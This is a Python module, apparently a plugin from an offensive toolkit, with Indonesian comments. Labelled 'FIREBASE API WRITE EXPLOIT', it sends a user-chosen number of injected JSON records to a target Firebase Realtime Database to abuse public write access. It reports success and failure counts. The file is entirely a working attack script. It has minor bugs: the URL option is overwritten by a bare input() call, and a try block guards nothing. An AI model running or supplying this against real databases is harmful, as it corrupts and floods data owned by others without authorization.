import requests
import json
import time

from app.colors import C

def execute(options):
    """
    Melakukan serangan Injeksi Data POST langsung ke Firebase Realtime Database
    untuk menguji Public Write Access dengan jumlah pengiriman kustom.
    """
    print(f"{C.MENU}\n--- FIREBASE API WRITE EXPLOIT ---")

    # Input URL DB
    target_url = options.get("URL")
    target_url = input().replace('http://', '').replace('https://', '')

    # Input path endpoint
    endpoint_path = options.get("PATH")

    # Input message
    message = options.get("MESSAGE")

    # Input jumlah exploit
    try:
        count = options.get("COUNT")
    except ValueError:
        print(f"{C.ERROR} Harus angka! Mengatur default ke 1.")
        count = 1

    # Memastikan URL dibentuk dengan benar
    url = f"https://{target_url}/{endpoint_path}.json"

    print(f"{C.MENU}\n[!] URL: {url}")
    print(f"{C.MENU}[!] Mengirim {count} Document...\n")

    success_count = 0
    fail_count = 0
    delay = 0.5

    # --- PERULANGAN PENGIRIMAN ---
    for i in range(count):
        current_time = int(time.time())
        payload_data = {
            "author": "Annonim",
            "message": f"{message} (#{i+1})",
            "timestamp": current_time,
            "payload": "Payload tag injeksi terkonfirmasi",
            "test_status": "SUCCESS"
        }

        try:
            response = requests.post(
                url,
                headers={'Content-Type': 'application/json'},
                data=json.dumps(payload_data),
                timeout=10
            )

            if response.status_code == 200:
                print(f"{C.SUCCESS} [{i+1}/{count}] ✅ Success!	|	Status: {response.status_code}	|	ID: {response.json().get('name')}")
                success_count += 1
            else:
                print(f"{C.ERROR} [{i+1}/{count}] ❌ Access denied.	|	Status: {response.status_code}")
                fail_count += 1

            if i < count - 1:
                time.sleep(delay)
        except requests.exceptions.RequestException as e:
            print(f"{C.ERROR} \n❌ ERROR KONEKSI pada pengiriman ke-{i+1}/{count}")
            fail_count += 1
            print(f"{C.ERROR}Detail: {e}")

    # Ringkasan Akhir
    print(f"\n{C.MENU}--- RINGKASAN EKSPLOITASI ---")
    print(f"{C.SUCCESS} Total Success: {success_count}")
    print(f"{C.ERROR} Total Gagal: {fail_count}")
